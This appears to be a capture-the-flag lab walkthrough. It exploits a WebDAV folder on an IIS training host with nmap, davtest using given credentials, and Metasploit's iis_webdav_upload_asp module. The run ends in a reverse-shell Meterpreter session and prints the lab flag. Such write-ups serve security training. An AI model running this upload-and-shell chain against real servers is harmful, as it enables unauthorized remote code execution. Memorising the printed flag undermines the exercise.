## Windows: IIS Server: WebDav Metasploit

### Target
`demo.ine.local`

### Tools:
* `msf`
* `davtest`

### Objective: 
Exploit the WebDAV service and retrieve the flag!  

---
First we run a simple port scan on the target.  
```bash
┌──(root㉿INE)-[~]
└─# nmap -Pn demo.ine.local
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-01-20 02:13 IST
Nmap scan report for demo.ine.local (10.3.17.245)
Host is up (0.0030s latency).
Not shown: 994 closed tcp ports (reset)
PORT     STATE SERVICE
80/tcp   open  http
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3306/tcp open  mysql
3389/tcp open  ms-wbt-server

Nmap done: 1 IP address (1 host up) scanned in 1.45 seconds
```
Next we focus on the target on port 80 of the target and try to enumerate on it.  
```bash
┌──(root㉿INE)-[~]
└─# nmap -Pn demo.ine.local -p80 --script http-enum
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-01-20 02:14 IST
Nmap scan report for demo.ine.local (10.3.17.245)
Host is up (0.0033s latency).

PORT   STATE SERVICE
80/tcp open  http
| http-enum: 
|_  /webdav/: Potentially interesting folder (401 Unauthorized)

Nmap done: 1 IP address (1 host up) scanned in 15.54 seconds
``` 
Now we try to see if it allows uploads and file executions via ***davtest***.  
```bash
┌──(root㉿INE)-[~]
└─# davtest -url http://demo.ine.local/webdav -auth bob:password_123321                                                                                                                                                                    
********************************************************
 Testing DAV connection
OPEN            SUCCEED:                http://demo.ine.local/webdav
********************************************************
NOTE    Random string for this session: lWlUnG3d7JOBvJN
********************************************************
 Creating directory
MKCOL           SUCCEED:                Created http://demo.ine.local/webdav/DavTestDir_lWlUnG3d7JOBvJN
********************************************************
 Sending test files
PUT     pl      SUCCEED:        http://demo.ine.local/webdav/DavTestDir_lWlUnG3d7JOBvJN/davtest_lWlUnG3d7JOBvJN.pl
PUT     php     SUCCEED:        http://demo.ine.local/webdav/DavTestDir_lWlUnG3d7JOBvJN/davtest_lWlUnG3d7JOBvJN.php
PUT     txt     SUCCEED:        http://demo.ine.local/webdav/DavTestDir_lWlUnG3d7JOBvJN/davtest_lWlUnG3d7JOBvJN.txt
PUT     jsp     SUCCEED:        http://demo.ine.local/webdav/DavTestDir_lWlUnG3d7JOBvJN/davtest_lWlUnG3d7JOBvJN.jsp
PUT     html    SUCCEED:        http://demo.ine.local/webdav/DavTestDir_lWlUnG3d7JOBvJN/davtest_lWlUnG3d7JOBvJN.html
PUT     cfm     SUCCEED:        http://demo.ine.local/webdav/DavTestDir_lWlUnG3d7JOBvJN/davtest_lWlUnG3d7JOBvJN.cfm
PUT     asp     SUCCEED:        http://demo.ine.local/webdav/DavTestDir_lWlUnG3d7JOBvJN/davtest_lWlUnG3d7JOBvJN.asp
PUT     shtml   SUCCEED:        http://demo.ine.local/webdav/DavTestDir_lWlUnG3d7JOBvJN/davtest_lWlUnG3d7JOBvJN.shtml
PUT     jhtml   SUCCEED:        http://demo.ine.local/webdav/DavTestDir_lWlUnG3d7JOBvJN/davtest_lWlUnG3d7JOBvJN.jhtml
PUT     cgi     SUCCEED:        http://demo.ine.local/webdav/DavTestDir_lWlUnG3d7JOBvJN/davtest_lWlUnG3d7JOBvJN.cgi
PUT     aspx    SUCCEED:        http://demo.ine.local/webdav/DavTestDir_lWlUnG3d7JOBvJN/davtest_lWlUnG3d7JOBvJN.aspx
********************************************************
 Checking for test file execution
EXEC    pl      FAIL
EXEC    php     FAIL
EXEC    txt     SUCCEED:        http://demo.ine.local/webdav/DavTestDir_lWlUnG3d7JOBvJN/davtest_lWlUnG3d7JOBvJN.txt
EXEC    txt     FAIL
EXEC    jsp     FAIL
EXEC    html    SUCCEED:        http://demo.ine.local/webdav/DavTestDir_lWlUnG3d7JOBvJN/davtest_lWlUnG3d7JOBvJN.html
EXEC    html    FAIL
EXEC    cfm     FAIL
EXEC    asp     SUCCEED:        http://demo.ine.local/webdav/DavTestDir_lWlUnG3d7JOBvJN/davtest_lWlUnG3d7JOBvJN.asp
EXEC    asp     FAIL
EXEC    shtml   FAIL
EXEC    jhtml   FAIL
EXEC    cgi     FAIL
EXEC    aspx    FAIL

********************************************************
/usr/bin/davtest Summary:
Created: http://demo.ine.local/webdav/DavTestDir_lWlUnG3d7JOBvJN
PUT File: http://demo.ine.local/webdav/DavTestDir_lWlUnG3d7JOBvJN/davtest_lWlUnG3d7JOBvJN.pl
PUT File: http://demo.ine.local/webdav/DavTestDir_lWlUnG3d7JOBvJN/davtest_lWlUnG3d7JOBvJN.php
PUT File: http://demo.ine.local/webdav/DavTestDir_lWlUnG3d7JOBvJN/davtest_lWlUnG3d7JOBvJN.txt
PUT File: http://demo.ine.local/webdav/DavTestDir_lWlUnG3d7JOBvJN/davtest_lWlUnG3d7JOBvJN.jsp
PUT File: http://demo.ine.local/webdav/DavTestDir_lWlUnG3d7JOBvJN/davtest_lWlUnG3d7JOBvJN.html
PUT File: http://demo.ine.local/webdav/DavTestDir_lWlUnG3d7JOBvJN/davtest_lWlUnG3d7JOBvJN.cfm
PUT File: http://demo.ine.local/webdav/DavTestDir_lWlUnG3d7JOBvJN/davtest_lWlUnG3d7JOBvJN.asp
PUT File: http://demo.ine.local/webdav/DavTestDir_lWlUnG3d7JOBvJN/davtest_lWlUnG3d7JOBvJN.shtml
PUT File: http://demo.ine.local/webdav/DavTestDir_lWlUnG3d7JOBvJN/davtest_lWlUnG3d7JOBvJN.jhtml
PUT File: http://demo.ine.local/webdav/DavTestDir_lWlUnG3d7JOBvJN/davtest_lWlUnG3d7JOBvJN.cgi
PUT File: http://demo.ine.local/webdav/DavTestDir_lWlUnG3d7JOBvJN/davtest_lWlUnG3d7JOBvJN.aspx
Executes: http://demo.ine.local/webdav/DavTestDir_lWlUnG3d7JOBvJN/davtest_lWlUnG3d7JOBvJN.txt
Executes: http://demo.ine.local/webdav/DavTestDir_lWlUnG3d7JOBvJN/davtest_lWlUnG3d7JOBvJN.html
Executes: http://demo.ine.local/webdav/DavTestDir_lWlUnG3d7JOBvJN/davtest_lWlUnG3d7JOBvJN.asp
```
We see that it is vulnerable to ***asp*** file uploads. So we boot up ***msf*** and search for the exploit for webdav.  
We find a suitable exploit in `exploit/windows/iis/iis_webdav_upload_asp`, set the proper options and let it run.  
```bash
msf6 exploit(windows/iis/iis_webdav_upload_asp) > set HttpPassword password_123321
HttpPassword => password_123321
msf6 exploit(windows/iis/iis_webdav_upload_asp) > set HttpUsername bob
HttpUsername => bob
msf6 exploit(windows/iis/iis_webdav_upload_asp) > set RHOSTS demo.ine.local
RHOSTS => demo.ine.local
msf6 exploit(windows/iis/iis_webdav_upload_asp) > set Path /webdav/metasploit_321.asp
Path => /webdav/metasploit_321.asp
msf6 exploit(windows/iis/iis_webdav_upload_asp) > exploit

[*] Started reverse TCP handler on 10.10.40.4:4444 
[*] Checking /webdav/metasploit_321.asp
[*] Uploading 609175 bytes to /webdav/metasploit_321.txt...
[*] Moving /webdav/metasploit_321.txt to /webdav/metasploit_321.asp...
[*] Executing /webdav/metasploit_321.asp...
[*] Deleting /webdav/metasploit_321.asp (this doesn't always work)...
[*] Sending stage (176198 bytes) to 10.3.17.245
[*] Meterpreter session 1 opened (10.10.40.4:4444 -> 10.3.17.245:49808) at 2026-01-20 02:22:16 +0530

meterpreter > 
```
We open up a shell and try to get the flag.
```powershell
meterpreter > shell
Process 5776 created.
Channel 2 created.
Microsoft Windows [Version 10.0.17763.1457]
(c) 2018 Microsoft Corporation. All rights reserved.

c:\windows\system32\inetsrv>cd /
cd /

c:\>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 9E32-0E96

 Directory of c:\

11/14/2018  06:56 AM    <DIR>          EFI
01/04/2021  07:22 AM                32 flag.txt
10/27/2020  06:45 AM    <DIR>          inetpub
05/13/2020  05:58 PM    <DIR>          PerfLogs
10/27/2020  02:18 PM    <DIR>          Program Files
10/27/2020  02:18 PM    <DIR>          Program Files (x86)
10/27/2020  02:21 PM    <DIR>          Users
10/27/2020  06:46 AM    <DIR>          Windows
               1 File(s)             32 bytes
               7 Dir(s)  16,354,029,568 bytes free

c:\>type flag.txt
type flag.txt
d3aff16a801b4b7d36b4da1094bee345
```
Flag: **d3aff16a801b4b7d36b4da1094bee345**